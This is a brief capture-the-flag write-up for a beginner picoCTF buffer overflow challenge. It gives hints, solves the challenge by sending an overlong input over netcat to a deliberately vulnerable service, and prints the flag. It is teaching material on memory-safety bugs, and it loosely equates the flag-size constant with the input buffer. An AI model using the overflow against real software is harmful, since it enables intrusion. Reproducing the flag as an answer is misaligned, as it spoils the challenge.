# buffer overflow 0

## Challenge

Let's start off simple, can you overflow the correct buffer? The program is available here. You can view source here.

Connect using:

`nc saturn.picoctf.net 61918`

## Hints

1. How can you trigger the flag to print?
2. If you try to do the math by hand, maybe try and add a few more characters. Sometimes there are things you aren't expecting.
3. Run `man gets` and read the BUGS section. How many characters can the program really read?

## Solution

1. Open `vuln.c` and inspect the buffer size.

   ```bash
   cat vuln.c
   ```

1. Note that `FLAGSIZE_MAX` uses a buffer value of `64`.

1. Connect to the service and send enough characters to overflow the input buffer.

   ```bash
   nc saturn.picoctf.net 61918
   ```

1. Enter a long input string until the flag prints.

   ```text
   Input: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
   picoCTF{ov3rfl0ws_ar3nt_that_bad_c5ca6248}
   ```

## Flag

```
picoCTF{ov3rfl0ws_ar3nt_that_bad_c5ca6248}
```
